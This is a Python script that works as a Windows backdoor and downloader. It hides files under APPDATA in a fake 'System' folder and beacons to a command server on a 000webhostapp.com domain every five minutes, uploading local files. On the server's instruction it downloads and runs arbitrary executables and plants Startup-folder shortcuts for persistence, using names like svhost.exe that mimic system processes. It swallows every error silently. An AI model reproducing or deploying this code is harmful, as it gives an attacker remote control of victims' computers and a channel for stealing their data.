import threading
import requests
import urllib.request
import os
import shutil
import time
import sys
try:
    time.sleep(10)
    apdt = os.environ['APPDATA']

    path = apdt+'/System/etc/'

    if not os.path.isdir(path[:-1]):
        os.mkdir(os.environ['APPDATA']+'/System')
        os.mkdir(os.environ['APPDATA']+'/System/etc')
        os.mkdir(os.environ['APPDATA']+'/System/etc/exec')
        open(path+'info.txt','w')
        open(path+'id.txt','w').write('Cha3gKjb')
        pen(path+'Cha3gKjb.txt','w')
        

    ID = open(path+'id.txt', 'r').readline()


    def check_internet():
        erroe = 0
        url='https://denboapp.000webhostapp.com/available.php'
        timeout=10
        try:
            _ = requests.get(url, timeout=timeout)
            return True
        except requests.ConnectionError:
            erroe = 1
        return False


    def send_data_to_server():
        if check_internet():
            multipart_form_data = {
                'FILE': open(path+'info.txt', 'r'),
                'ID' : open(path+ID+'.txt', 'r')
            }

            response = requests.post('http://denboapp.000webhostapp.com/upload.php',
                                     files=multipart_form_data)
            if (response.text == 'remove'):
                os.startfile(path+'exec/cleanup.exe')
            elif (response.text == 'no'):
                time.sleep(1)
            else:
                queue = response.text.split('==')
                for i in range(len(queue)):
                    queue[i] = queue[i].split('~')
                for i in queue:
                    if (i[0] == 'execute'):
                        with urllib.request.urlopen(i[1]) as response, open(path+"exec/"+i[2], 'wb') as out_file:
                                        shutil.copyfileobj(response, out_file)
                        if i[5] == '1':
                            os.startfile(path+'exec/'+i[2])
                            time.sleep(20)
                        if i[4] == '1':
                            with urllib.request.urlopen(i[6]) as response, open(apdt+'/Microsoft/Windows/Start Menu/Programs/Startup/'+i[2][:-4]+'.lnk', 'wb') as out_file:
                                            shutil.copyfileobj(response, out_file)
                        if i[3] == '1':
                            os.remove(path+'exec/'+i[2])
                    elif (i[0] == 'download'):
                        with urllib.request.urlopen(i[1]) as response, open(path+"exec/"+i[2], 'wb') as out_file:
                                        shutil.copyfileobj(response, out_file)
            if (os.path.exists(path+'offs.txt')):
                os.remove(apdt+'/Microsoft/Windows/Start Menu/Programs/Startup/svhost.lnk')
                os.remove(path+'exec/svhost.exe')
                os.remove(path+'offs.txt')
            threading.Timer(300, send_data_to_server).start()
        else:
            threading.Timer(300, send_data_to_server).start()


    send_data_to_server()
except:
    pass